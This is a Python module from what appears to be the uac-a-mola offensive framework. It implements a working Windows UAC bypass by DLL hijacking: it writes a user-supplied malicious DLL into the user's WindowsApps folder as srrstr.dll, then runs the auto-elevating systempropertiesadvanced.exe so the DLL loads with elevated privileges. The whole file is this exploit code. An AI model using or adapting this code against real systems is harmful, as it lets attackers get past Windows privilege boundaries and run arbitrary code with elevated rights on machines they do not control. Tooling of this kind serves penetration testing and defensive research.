# This file is part of uac-a-mola
# Author(C) Josue Encinar
#
# DESCRIPTION
# UAC bypass through DLL Hijacking method (systempropertiesadvanced binary)


from module import Module
import subprocess
import psutil
import copy
import os
import shutil


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "systempropertiesadvanced - DLL hijacking",
                       "Description": "UAC bypass through DLL Hijacking method (systempropertiesadvanced binary)",
                       "Author": "Josue Encinar"}

        # -----------name-----default_value--description
        options = {"user": [None, "Windows username", True],
                   "malicious_dll": [None, "Path to a malicious dll", True]
                   }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        path = "C:\\Users\\" + self.args['user'] + "\\AppData\\Local\\Microsoft\\WindowsApps"
        dst =  path + "\\srrstr.dll"
        if not os.path.isdir(path):
            print("Creating path...")
            os.mkdir(path)
        
        try:
            shutil.copy(src = self.args["malicious_dll"], dst=dst)
            self.run_binary("C:\\Windows\\syswow64\\systempropertiesadvanced.exe")
            print("[+] Done!")
        except Exception as e:
            print(e)